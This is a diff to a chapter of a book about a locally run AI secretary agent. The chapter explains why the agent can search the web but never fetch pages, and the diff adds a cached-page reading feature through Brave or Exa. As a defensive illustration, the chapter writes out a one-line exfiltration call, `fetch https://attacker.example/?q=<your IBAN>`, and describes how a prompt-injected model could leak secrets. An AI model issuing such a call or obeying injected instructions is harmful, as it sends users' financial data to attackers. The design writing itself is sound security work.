@@ -441,9 +441,10 @@ stops an attacker, doing everyday work.
 ## Search, never fetch
 
 The second way out is the web, and it's built differently from every
-web tool you've met. The secretary can *search*, and it can't *read a
-page*. There's no `fetch`, no `web_scrape`, no sub-agent that has
-them. You get the engine's short snippets, and nothing else.
+web tool you've met. The secretary can *search*, and it can't *visit
+a page*. There's no `fetch`, no `web_scrape`, no sub-agent that has
+them. Out of the box you get the engine's short snippets, and nothing
+else.
 
 That's what `_vouched` on the map means. A search query does leave
 your machine, and an injected model can put a secret in one. But it
@@ -452,6 +453,18 @@ the engine's logs back. Give the same agent `fetch` and the model
 picks the host: `fetch https://attacker.example/?q=<your IBAN>` is a
 complete exfiltration in one call. "Search, never fetch" closes that
 by never holding the tool, not by checking what goes into it.
+
+Snippets often aren't enough, and there's a way to read whole pages
+without visiting them. Put a Brave or Exa key into the `search:` block
+of `~/.pikuri-examples-config.yaml`, and the secretary asks the engine
+for each result's page text in the search request itself, from the
+engine's own copy of the page. A result then carries a handle like
+`[a3f9c21e]`, and `web_read_cached` hands back that page's text by its
+handle. It takes no URL and sends nothing, so the query is still the
+only thing that leaves, and the map's verdict doesn't move. The
+[trifecta chapter](trifecta-detector.md) works through why a handle
+is safe where a URL isn't. DuckDuckGo keeps no page text, so with it
+alone you're back to snippets.
 
 Every query is shown to you before it leaves:
 
@@ -651,8 +664,10 @@ guard's new-recipient note reaches you only if the model repeats it.
   `~/Documents`: the secretary tells you to use another assistant.
   That one is book 2's OS assistant, and it lives in a sandbox.
 - **Office formats.** Book 2's extractors.
-- **Reading web pages.** On purpose: it's the cut this whole chapter
-  is built around.
+- **Visiting web pages.** On purpose: it's the cut this whole chapter
+  is built around. With a Brave or Exa key it reads the engine's copy
+  of a result instead, as [Search, never fetch](#search-never-fetch)
+  shows.
 - **Sub-agents.** Nothing here needs one. A researcher persona would
   bring `fetch` back.
 
